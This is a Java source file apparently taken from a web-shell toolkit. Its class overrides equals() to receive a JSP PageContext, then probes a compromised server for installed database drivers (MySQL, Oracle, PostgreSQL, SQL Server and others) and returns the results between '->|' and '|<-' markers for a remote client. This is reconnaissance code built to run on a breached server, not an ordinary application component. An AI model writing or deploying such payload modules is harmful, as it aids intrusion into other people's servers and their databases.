import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.jsp.PageContext;

public class Probedb {
    @Override
    public boolean equals(Object obj) {
        PageContext page = (PageContext) obj;
        ServletRequest request = page.getRequest();
        ServletResponse response = page.getResponse();
        String cs = request.getParameter("charset") != null ? request.getParameter("charset") : "UTF-8";
        StringBuffer output = new StringBuffer("");
        StringBuffer sb = new StringBuffer("");
        String tag_s = "->|";
        String tag_e = "|<-";
        try {
            response.setContentType("text/html");
            request.setCharacterEncoding(cs);
            response.setCharacterEncoding(cs);
            output.append(tag_s);
            sb.append(ProbedbCode((HttpServletRequest) request));
            output.append(sb.toString());
            output.append(tag_e);
            page.getOut().print(output.toString());
        } catch (Exception e) {
            sb.append("ERROR" + ":// " + e.toString());
        }
        return true;
    }

    String ProbedbCode(HttpServletRequest r) {
        String[] drivers = new String[]{
                "com.mysql.jdbc.Driver",
                "com.mysql.cj.jdbc.Driver",
                "oracle.jdbc.driver.OracleDriver",
                "org.postgresql.Driver",
                "weblogic.jdbc.mssqlserver4.Driver",
                "com.microsoft.sqlserver.jdbc.SQLServerDriver",
                "com.inet.pool.PoolDriver",
        };
        String ret = "";
        for (int i = 0; i < drivers.length; i++) {
            try {
                Class.forName(drivers[i]);
                ret += drivers[i] + "\t1\n";
            } catch (Exception e) {
                ret += drivers[i] + "\t0\n";
            }
        }
        return ret;
    }
}
